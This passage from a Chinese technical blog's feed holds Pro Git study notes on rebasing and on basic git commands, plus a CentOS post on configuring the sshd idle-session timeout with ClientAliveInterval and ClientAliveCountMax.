&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge experiment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202617.jpeg&quot; alt=&quot;F 3-30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时 C4’ 指向的快照就跟上面使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;merge&lt;/code&gt; 命令的例子中 C5 指向的快照一模一样了。这两种整合方法最终结果没有任何区别，但是变基会使得提交历史更加整洁。&lt;/p&gt;

&lt;h3 id=&quot;更有趣的变基例子&quot;&gt;更有趣的变基例子&lt;/h3&gt;
&lt;p&gt;在对两个分支进行变基时，所生成的“重演”并不一定需要在目标分支上应用，也可以指定另外的一个分支进行应用。&lt;/p&gt;

&lt;p&gt;下面例子是这样：在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支上创建了一个特性分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt;，提交了 C3 和 C4。然后在 C3 上创建了特性分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt;,提交了 C8 和 C9。最后在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 分支提交了 C10。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202629.jpeg&quot; alt=&quot;F 3-31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;假设需要将 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; 中的修改合并到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支，但不需要合并 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 中的修改。可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git rebase&lt;/code&gt; 命令的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--onto&lt;/code&gt; 选项，选中在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; 分支里但不在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 分支里的修改（C8/C9），将它们在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支上重演：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git rebase &lt;span class=&quot;nt&quot;&gt;--onto&lt;/span&gt; master server client
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令的含义：取出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; 分支，找出处于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; 分支和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 分支的共同祖先之后的修改，然后在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支上重演一遍。&lt;/p&gt;

&lt;p&gt;执行后的效果如图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202641.jpeg&quot; alt=&quot;F 3-32&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在可以进行快速合并了：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge client
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202650.jpeg&quot; alt=&quot;F 3-33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后将 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 分支也整合进来：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git rebase master server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202702.jpeg&quot; alt=&quot;F 3-34&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如图，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 的代码被“续”到了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 后面&lt;/p&gt;

&lt;p&gt;然后再进行快进合并主分支 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server&lt;/code&gt; 分支中的修改都已经整合到了主分支，可以删除这两个分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; client
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后的提交历史如图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202713.jpeg&quot; alt=&quot;F 3-35&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;变基的风险&quot;&gt;变基的风险&lt;/h3&gt;

&lt;p&gt;不要对在你的仓库外有副本的分支执行变基，会使提交记录变得混乱。&lt;/p&gt;

&lt;h3 id=&quot;用变基解决变基&quot;&gt;用变基解决变基&lt;/h3&gt;

&lt;p&gt;如果真的发生了变基之后被重复提交的情况你，再次使用变基命令来整理。&lt;/p&gt;

&lt;p&gt;简单的方法是使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull --rebase&lt;/code&gt; 而不是直接使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt;。或者可以手动 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch&lt;/code&gt; 再执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git rebase remote/master&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;变基-vs-合并&quot;&gt;变基 vs. 合并&lt;/h3&gt;

&lt;p&gt;一种观点认为仓库的提交历史是 &lt;strong&gt;记录实际发生过什么&lt;/strong&gt; ；另一种是 &lt;strong&gt;项目过程中发生的故事&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;总的原则是，只对尚未推送或分享给他人的本地修改执行变基操作，清理历史，从不对已推送的提交执行变基操作。&lt;/p&gt;</content><author><name></name></author><category term="git" /><category term="github" /><category term="progit" /><category term="note" /><summary type="html">本部分主要介绍 Git 的分支功能。</summary></entry><entry><title type="html">CentOS 配置登录会话超时，防止 SSH 自动退出</title><link href="https://blog.securitainment.io/centos/ssh/2020/09/04/CentOS-setup-session-timeout-for-ssh-auto-logout.html" rel="alternate" type="text/html" title="CentOS 配置登录会话超时，防止 SSH 自动退出" /><published>2020-09-04T22:53:40+08:00</published><updated>2020-09-04T22:53:40+08:00</updated><id>https://blog.securitainment.io/centos/ssh/2020/09/04/CentOS-setup-session-timeout-for-ssh-auto-logout</id><content type="html" xml:base="https://blog.securitainment.io/centos/ssh/2020/09/04/CentOS-setup-session-timeout-for-ssh-auto-logout.html">&lt;p&gt;在远程管理 VPS 的时候经常会遇到登录会话无活动，导致会话超时 SSH 自动退出的问题，可以通过两个方式在服务端修改配置解决。&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/ssh/sshd_config&lt;/code&gt; 文件中的两个参数，和 SSH 无活动会话超时自动退出有关：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ClientAliveInterval
ClientAliveCountMax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd_config&lt;/code&gt; 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man&lt;/code&gt; 帮助页面有对于这两个参数的解释：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ man sshd_config
     ClientAliveCountMax
             Sets the number of client alive messages (see below) which may be sent without sshd(8) receiving any messages back from the client. If this threshold is reached while client alive messages are being sent, sshd will disconnect the client, terminating the session. It is important to note that the use of client alive messages is very different from TCPKeepAlive (below). The client alive messages are sent through the encrypted channel and therefore will not be spoofable. The TCP keepalive option enabled by TCPKeepAlive is spoofable.  The client alive mechanism is valuable when the client or server depend on knowing when a connection has become inactive. The default value is 3. If ClientAliveInterval (see below) is set to 15, and ClientAliveCountMax is left at the default, unresponsive SSH clients will be disconnected after approximately 45 seconds. This option applies to protocol version 2 only.

     ClientAliveInterval
             Sets a timeout interval in seconds after which if no data has been received from the client, sshd(8) will send a message through the encrypted channel to request a response from the client. The default is 0, indicating that these messages will not be sent to the client. This option applies to protocol version 2 only.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以有两种方法来配置无活动会话超时。&lt;/p&gt;

&lt;h2 id=&quot;method-1&quot;&gt;Method 1&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/ssh/sshd_config&lt;/code&gt; 文件中配置超时参数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vi /etc/ssh/sshd_config
ClientAliveInterval 5m          &lt;span class=&quot;c&quot;&gt;# 5 分钟&lt;/span&gt;
ClientAliveCountMax 2           &lt;span class=&quot;c&quot;&gt;# 2 次&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;重启 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; 服务&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;service sshd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样就将超时时间设置成了 10 分钟（5分钟检测一次客户端活动，共检测两次）。&lt;/p&gt;

&lt;h2 id=&quot;method-2&quot;&gt;Method 2&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;通过设置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClientAliveCountMax&lt;/code&gt; 为 0，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClientAliveInterval&lt;/code&gt; 为 10m 来达到同样的效果&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vi /etc/ssh/sshd_config
ClientAliveInterval 10m          &lt;span class=&quot;c&quot;&gt;# 10 minutes&lt;/span&gt;
ClientAliveCountMax 0            &lt;span class=&quot;c&quot;&gt;# 0 times&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;重启 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; 服务&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;service sshd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;method-1-和-method-2-的不同&quot;&gt;Method 1 和 Method 2 的不同&lt;/h2&gt;

&lt;p&gt;Method 1 ：如果客户端 5 分钟没有活动，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; 会向客户端发送保持连接信息，最多发送两次，如果达到两次则断开客户端连接。&lt;/p&gt;

&lt;p&gt;Method 2 ：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sshd&lt;/code&gt; 不会向客户端发送信息，如果客户端 10 分钟没有活动（服务端 10 分钟没有收到客户端消息），服务端会直接断开连接。&lt;/p&gt;</content><author><name></name></author><category term="centos" /><category term="ssh" /><summary type="html">在远程管理 VPS 的时候经常会遇到登录会话无活动，导致会话超时 SSH 自动退出的问题，可以通过两个方式在服务端修改配置解决。</summary></entry><entry><title type="html">progit 笔记 02 - Git 基础</title><link href="https://blog.securitainment.io/git/github/progit/note/2020/07/20/ProGit-note-02.html" rel="alternate" type="text/html" title="progit 笔记 02 - Git 基础" /><published>2020-07-20T00:46:25+08:00</published><updated>2020-07-20T00:46:25+08:00</updated><id>https://blog.securitainment.io/git/github/progit/note/2020/07/20/ProGit-note-02</id><content type="html" xml:base="https://blog.securitainment.io/git/github/progit/note/2020/07/20/ProGit-note-02.html">&lt;p&gt;本部分涵盖 Git 使用中的各种基本命令，包括初始化仓库（repository）、开始或停止跟踪（track）文件、暂存（stage）或提交（commit）更改；配置 Git 来忽略指定的文件和文件模式、撤销错误操作、浏览项目的历史版本以及不同提交（commits）间的差异、推送（push）到远程仓库以及从远程仓库拉取（pull）文件等。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;获取-git-仓库&quot;&gt;获取 Git 仓库&lt;/h2&gt;
&lt;h3 id=&quot;在现有的项目目录中初始化仓库&quot;&gt;在现有的项目目录中初始化仓库&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git init
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令将创建一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; 子目录，这个子目录包含初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 这时仅做了初始化，项目文件还没有被跟踪。通过以下命令跟踪并提交&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.c
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add LICENSE
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'initial project version'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样就得到了一个跟踪着若干文件的 Git 仓库。&lt;/p&gt;

&lt;h3 id=&quot;克隆现有仓库&quot;&gt;克隆现有仓库&lt;/h3&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 命令克隆一个现有仓库，比如克隆 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libgit2&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/libgit2/libgit2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这会在当前目录下创建一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libgit2&lt;/code&gt; 目录，并在该目录下初始化一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; 文件夹，从远程仓库拉取所有数据存放在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.git&lt;/code&gt; 文件夹内，然后从中读取最新版本的拷贝，并且存放在应该在的位置。&lt;/p&gt;

&lt;p&gt;如果想要自定义本地仓库的名字，可以使用下面的命令：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/libgit2/libgit2 mylibgit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样在本地创建的仓库名字就会变为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mylibgit&lt;/code&gt;。&lt;/p&gt;

&lt;h2 id=&quot;检查当前文件状态&quot;&gt;检查当前文件状态&lt;/h2&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 命令查看仓库中哪些文件处于什么状态。如果检查刚克隆后的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libgit2&lt;/code&gt; 仓库，会看到类似输出：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

nothing to commit, working directory clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时新建一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件，再次使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 命令时，将看到一个新的未追踪文件：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'My Project'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; README
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master

No commits yet

Untracked files:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to include &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	README

nothing added to commit but untracked files present &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add&quot;&lt;/span&gt; to track&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在状态报告中可以看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件出现在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;untracked files&lt;/code&gt; 下面。未跟踪的文件意味着 Git 在之前的快照（提交）中没有这些文件；Git 不会自动将之纳入跟踪范围，除非你明明白白地告诉它“我需要跟踪该文件”。&lt;/p&gt;

&lt;h3 id=&quot;跟踪新文件&quot;&gt;跟踪新文件&lt;/h3&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git add&lt;/code&gt; 命令开始跟踪一个文件。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git add&lt;/code&gt; 命令使用文件或目录的路径作为参数；如果参数是目录的路径，该命令将递归地跟踪该目录下的所有文件。比如要跟踪 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add README
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时再运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 检查状态，会看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件已被跟踪，并且处于暂存状态：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master

No commits yet

Changes to be committed:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git rm --cached &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	new file:   README

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里可以看到文件在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Changes to be committed&lt;/code&gt; 下面，说明是已暂存状态。&lt;/p&gt;

&lt;h3 id=&quot;暂存已修改的文件&quot;&gt;暂存已修改的文件&lt;/h3&gt;
&lt;p&gt;如果修改了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件，再次运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 时将会看到：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master

No commits yet

Changes to be committed:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git rm --cached &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	new file:   README

Changes not staged &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commit:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to update what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git restore &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to discard changes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;working directory&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	modified:   README

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件同时出现在等待提交区（暂存区）和未暂存区，是因为 Git 只暂存了上次运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git add&lt;/code&gt; 命令时的那个版本，而不是当前修改过的版本。&lt;/p&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Changes not staged for commit:&lt;/code&gt; 看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 说明已修改了但是没有放到暂存区。要暂存这次更新，需要运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git add&lt;/code&gt; 命令。 这是个多功能命令：可以用它开始跟踪新文件，或者把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态等。这个命令理解为“添加内容到下一次提交中”而不是“将一个文件添加到项目中”要更加合适。&lt;/p&gt;

&lt;p&gt;将修改后的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 文件添加到下一次提交，并再次查看状态：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git add README
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
On branch master

No commits yet

Changes to be committed:
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git rm --cached &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	new file:   README

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;状态简览&quot;&gt;状态简览&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status&lt;/code&gt; 命令输出当前仓库状态信息。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status -s&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git status --short&lt;/code&gt; 获得更为紧凑的状态信息：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
A  NEWADD
M  README
MM UNSTAGED
?? LICENSE.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面的报告表示，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NEWADD&lt;/code&gt; 文件前的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; 表示该文件是新添加的并且放入了暂存区，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;README&lt;/code&gt; 前的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M&lt;/code&gt; 表示文件被修改了并且放入了暂存区，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UNSTAGED&lt;/code&gt; 文件前左边的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M&lt;/code&gt; 表示被修改并且放入了暂存区，右边的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M&lt;/code&gt; 表示文件被修改但还未放入暂存区，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LICENSE.txt&lt;/code&gt; 前的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;??&lt;/code&gt; 表示文件未被追踪。&lt;/p&gt;

&lt;h3 id=&quot;忽略文件&quot;&gt;忽略文件&lt;/h3&gt;
